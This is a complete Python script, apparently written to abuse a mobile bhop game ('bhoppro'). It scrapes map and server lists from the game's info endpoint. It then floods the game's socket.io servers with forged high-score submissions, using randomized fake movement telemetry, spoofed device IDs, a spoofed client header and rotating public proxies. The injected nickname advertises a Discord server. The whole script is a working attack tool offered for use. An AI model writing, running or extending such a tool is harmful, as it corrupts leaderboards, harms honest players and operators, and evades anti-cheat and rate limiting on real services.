#!/usr/bin/env python3
"""
Map list updater + Leaderboard flooder
- Fetches active maps from https://infocdn.bhoppro.com/ and maintains a local file.
- Reads that file and sends fake scores for maps with a defined time.
- Now supports fully automatic mode with --auto.
"""

import asyncio
import socketio
import aiohttp
import requests
import base64
import os
import random
import sys
import re
import argparse
from pathlib import Path

# Try to import BeautifulSoup for robust HTML parsing
try:
    from bs4 import BeautifulSoup
except ImportError:
    BeautifulSoup = None
    print("[!] BeautifulSoup not installed. Using regex fallback for HTML parsing.")
    print("[!] Install it with: pip install beautifulsoup4")

# ----------------------------------------------------------------------
# HELPERS
# ----------------------------------------------------------------------

def ask_yes_no(question, default="y"):
    prompt = "[Y/n]" if default == "y" else "[y/N]"
    answer = input(f"{question} {prompt} ").strip().lower()
    if answer == "":
        return default == "y"
    return answer in ("y", "yes")

def ask_int(question, default):
    answer = input(f"{question} (default: {default}) ").strip()
    return default if answer == "" else int(answer)

def ask_float(question, default):
    answer = input(f"{question} (default: {default}) ").strip()
    return default if answer == "" else float(answer)

def ask_str(question, default):
    answer = input(f"{question} (default: {default}) ").strip()
    return default if answer == "" else answer

def generate_guid():
    raw = os.urandom(16)
    full = base64.b64encode(raw).decode()
    short = full[:12]
    return full, short

def random_device():
    return f"a_{random.randint(1000000000000000000, 9999999999999999999)}"

# ----------------------------------------------------------------------
# MAP LIST FETCHER
# ----------------------------------------------------------------------

def fetch_maps():
    """
    Fetch the list of map names from the HTML table at https://infocdn.bhoppro.com/
    Returns a list of strings (map names).
    """
    try:
        resp = requests.get("https://infocdn.bhoppro.com/", timeout=10)
        html = resp.text
        maps = []

        if BeautifulSoup:
            soup = BeautifulSoup(html, 'html.parser')
            rows = soup.find_all('tr')
            for row in rows:
                tds = row.find_all('td')
                if len(tds) >= 1:
                    map_name = tds[0].get_text(strip=True)
                    if map_name:
                        maps.append(map_name)
        else:
            # Fallback: simple regex to extract the first <td> inside each <tr>
            pattern = r'<tr>\s*<td>([^<]+)</td>'
            matches = re.findall(pattern, html, re.IGNORECASE)
            maps = matches

        print(f"[+] Found {len(maps)} maps from server list.")
        return maps
    except Exception as e:
        print(f"[!] Failed to fetch map list: {e}")
        return []

# ----------------------------------------------------------------------
# MAP FILE UPDATE
# ----------------------------------------------------------------------

def update_maps_file(filepath="maps.txt"):
    """
    Read existing file (map,time), fetch current maps, add new ones with time=0.0,
    and write back. Existing times are preserved.
    """
    # Read existing entries
    existing = {}
    if Path(filepath).exists():
        with open(filepath, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                parts = line.split(",", 1)
                if len(parts) == 2:
                    name, time_str = parts
                    existing[name] = time_str
                else:
                    # If no time, set to 0.0
                    existing[parts[0]] = "0.0"

    # Fetch current map list
    current_maps = fetch_maps()
    if not current_maps:
        print("[!] No maps fetched. Aborting update.")
        return

    # Add new maps with default time 0.0
    added = 0
    for m in current_maps:
        if m not in existing:
            existing[m] = "0.0"
            added += 1

    # Write back
    with open(filepath, "w", encoding="utf-8") as f:
        for name, time_str in existing.items():
            f.write(f"{name},{time_str}\n")

    print(f"[+] Updated {filepath}: {len(existing)} maps total, {added} new added.")
    print("[*] Edit the file to set times (seconds) for the maps you want to flood.")

# ----------------------------------------------------------------------
# SERVER FETCHER
# ----------------------------------------------------------------------

def get_servers_for_map(map_name):
    try:
        resp = requests.get(f"https://infocdn.bhoppro.com/map/{map_name}", timeout=5)
        data = resp.json()
        mapinfos = data.get("mapinfos", [])
        if not mapinfos:
            print(f"[!] No servers found for map '{map_name}'")
            return []
        servers = []
        for entry in mapinfos:
            ipport = entry.get("ipport")
            if ipport and ":" in ipport:
                ip, port = ipport.split(":")
                servers.append({"ip": ip, "port": port, "name": entry.get("server", "unknown")})
        return servers
    except Exception as e:
        print(f"[!] Failed to fetch map servers: {e}")
        return []

# ----------------------------------------------------------------------
# SCORE SENDER (flood logic)
# ----------------------------------------------------------------------

async def send_one_score(bot_id, ip, port, map_name, nick, time_val, score,
                         proxy_str=None, verbose=False):
    guid_full, guid_sub = generate_guid()
    device_id = random_device()
    str_time = f"{int(time_val)//60:02d}:{time_val%60:06.3f}"  # "00:18.285"

    # Build the full payload (random movement stats)
    payload = {
        "nick": nick,
        "score": score,
        "time": time_val,
        "str_time": str_time,
        "str_nick": "discord.gg/CkX5MqZXSJ",
        "flag": "",
        "guid": guid_full,
        "rank": "Silver I",
        "sid": device_id,
        "m": "v",
        "installerName": "com.android.vending",
        "speed_array": [random.uniform(0, 200) for _ in range(10)],
        "look_array": [random.uniform(-180, 180) for _ in range(10)],
        "max_speed": random.uniform(100, 500),
        "BunnyArtisHizi": random.randint(30, 70),
        "analog_bunny_mult": random.uniform(0.5, 1.0),
        "max_carpan": random.uniform(100, 600),
        "max_carpan1": 0,
        "max_carpan2": random.uniform(100, 600),
        "max_yfactor": 1,
        "total_force": random.uniform(1000, 20000),
        "total_speed": random.uniform(100000, 2000000),
        "total_frame": random.randint(100, 2000),
        "total_carpan": random.uniform(1000, 20000),
        "total_frame_carpan": random.randint(10, 300),
        "total_score_collision": random.randint(0, 20),
        "timescale": 1,
        "gravity": -12,
        "jumpforce": 40,
        "controltype": 4,
        "controltype_str": "Standart",
        "demoRandom": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=12))
    }

    connector = aiohttp.TCPConnector(limit=0, force_close=True)
    timeout = aiohttp.ClientTimeout(total=10)
    session_kwargs = {"connector": connector, "timeout": timeout}
    if proxy_str:
        session_kwargs["proxy"] = f"http://{proxy_str}"

    sio = socketio.AsyncClient()
    async with aiohttp.ClientSession(**session_kwargs) as session:
        sio.http_session = session

        @sio.event
        async def connect():
            if verbose:
                print(f"[+] Bot {bot_id} connected")
            await sio.emit("joinroom", {
                "room": map_name,
                "v": "2.6.3",
                "c": random.randint(0, 99999999),
                "m": "v",
                "guid": guid_full,
                "guidsub": guid_sub
            })
            await sio.emit("newscore", payload)
            if verbose:
                print(f"[✓] Bot {bot_id} sent {nick}: {time_val}s (score {score})")
            await asyncio.sleep(0.3)
            await sio.disconnect()

        @sio.event
        async def disconnect():
            if verbose:
                print(f"[-] Bot {bot_id} done")

        try:
            headers = {"User-Agent": "BestHTTP/2 v2.8.4", "Origin": "http://localhost"}
            await sio.connect(
                f"http://{ip}:{port}",
                socketio_path="socket.io",
                transports=['websocket'],
                headers=headers,
                wait_timeout=5
            )
            await sio.wait()
        except Exception as e:
            if verbose:
                print(f"[!] Bot {bot_id} error: {e}")

async def flood_map(map_name, ip, port, nick, time_val, score, proxies, concurrency, verbose, total_entries):
    sem = asyncio.Semaphore(concurrency)

    async def worker(i):
        async with sem:
            proxy = random.choice(proxies) if proxies else None
            await send_one_score(i, ip, port, map_name, nick, time_val, score,
                                 proxy, verbose)

    tasks = [asyncio.create_task(worker(i)) for i in range(total_entries)]
    await asyncio.gather(*tasks)

# ----------------------------------------------------------------------
# FLOOD FROM FILE (with automatic mode)
# ----------------------------------------------------------------------

def flood_from_file(filepath="maps.txt", auto=False, scores_per_map=5, concurrency=50,
                    nick="MADE BY D4V1 [discord.gg/CkX5MqZXSJ]", score_val=163,
                    use_proxies=False, server_selection="random"):
    # Read the file
    entries = []
    if not Path(filepath).exists():
        print(f"[!] File {filepath} not found. Run with --fetch first.")
        return

    with open(filepath, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            parts = line.split(",", 1)
            if len(parts) == 2:
                name, time_str = parts
                try:
                    time_val = float(time_str)
                except ValueError:
                    time_val = 0.0
                if time_val > 0:  # only process maps with a set time
                    entries.append((name, time_val))

    if not entries:
        print("[!] No maps with time > 0 found in the file.")
        print("[*] Edit maps.txt and set a time for the maps you want to flood.")
        return

    print(f"[+] Found {len(entries)} maps with valid times.")

    if not auto:
        # Interactive mode
        nick = ask_str("Nickname to use", nick)
        score_val = ask_int("Score (e.g., 163)", score_val)
        scores_per_map = ask_int("Number of scores per map", scores_per_map)
        concurrency = ask_int("Simultaneous connections", concurrency)
        use_proxies = ask_yes_no("Use proxies?", "n")
        if use_proxies:
            proxy_url = "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/refs/heads/master/http.txt"
        else:
            proxy_url = None
    else:
        print(f"[*] Auto mode: using nick='{nick}', score={score_val}, scores_per_map={scores_per_map}, concurrency={concurrency}, proxies={use_proxies}, server_selection={server_selection}")

    # Fetch proxies if needed
    proxies = []
    if use_proxies:
        proxy_url = "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/refs/heads/master/http.txt"
        try:
            resp = requests.get(proxy_url, timeout=10)
            proxies = resp.text.split()
            proxies = [p for p in proxies if ':' in p]
            print(f"[+] Loaded {len(proxies)} proxies")
        except Exception as e:
            print(f"[!] Failed to fetch proxies: {e}")

    # For each map, get servers and flood
    for map_name, time_val in entries:
        print(f"\n[*] Processing map: {map_name} (time: {time_val})")
        servers = get_servers_for_map(map_name)
        if not servers:
            print(f"[!] Skipping {map_name} – no servers found.")
            continue

        # Select target servers
        if server_selection == "all":
            targets = servers
            per_server = scores_per_map // len(targets) if len(targets) > 0 else scores_per_map
            if per_server == 0:
                per_server = 1
            print(f"[*] Targeting ALL {len(servers)} servers for {map_name}")
        else:  # random
            targets = [random.choice(servers)]
            per_server = scores_per_map
            print(f"[*] Targeting ONE random server: {targets[0]['ip']}:{targets[0]['port']}")

        # Send scores to each target server
        for srv in targets:
            print(f"[*] Sending {per_server} entries to {srv['ip']}:{srv['port']}")
            asyncio.run(flood_map(
                map_name, srv['ip'], srv['port'],
                nick, time_val, score_val,
                proxies, concurrency, verbose=True,  # you can set verbose False if you want less output
                total_entries=per_server
            ))

    print("\n[*] Flooding completed.")

# ----------------------------------------------------------------------
# MAIN
# ----------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(description="Map list updater & Leaderboard flooder")
    parser.add_argument("--fetch", action="store_true", help="Update the maps.txt file with current map list")
    parser.add_argument("--flood", action="store_true", help="Read maps.txt and send scores")
    parser.add_argument("--file", default="maps.txt", help="Path to the map file (default: maps.txt)")
    # Automatic mode arguments
    parser.add_argument("--auto", action="store_true", help="Run in fully automatic mode (no prompts)")
    parser.add_argument("--scores", type=int, default=5, help="Number of scores per map (auto mode)")
    parser.add_argument("--concurrency", type=int, default=50, help="Concurrent connections (auto mode)")
    parser.add_argument("--nick", default="MADE BY D4V1 [discord.gg/CkX5MqZXSJ]", help="Nickname to use (auto mode)")
    parser.add_argument("--score", type=int, default=163, help="Score value (auto mode)")
    parser.add_argument("--proxies", choices=["yes", "no"], default="no", help="Use proxies? (auto mode)")
    parser.add_argument("--server", choices=["random", "all"], default="random", help="Server selection (auto mode)")
    args = parser.parse_args()

    if args.fetch:
        update_maps_file(args.file)
        return

    if args.flood:
        # If --auto is given, use the provided parameters; otherwise, interactive
        flood_from_file(
            filepath=args.file,
            auto=args.auto,
            scores_per_map=args.scores,
            concurrency=args.concurrency,
            nick=args.nick,
            score_val=args.score,
            use_proxies=(args.proxies == "yes"),
            server_selection=args.server
        )
        return

    # Interactive mode if no arguments
    print("\n" + "=" * 60)
    print("  MAP LIST UPDATER & LEADERBOARD FLOODER")
    print("=" * 60)
    action = ask_str("Choose action: (f)etch maps, (l)oad and flood", "f")
    if action.lower() in ("f", "fetch"):
        update_maps_file(args.file)
    else:
        flood_from_file(args.file, auto=False)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[*] Interrupted. Exiting.")
        sys.exit(0)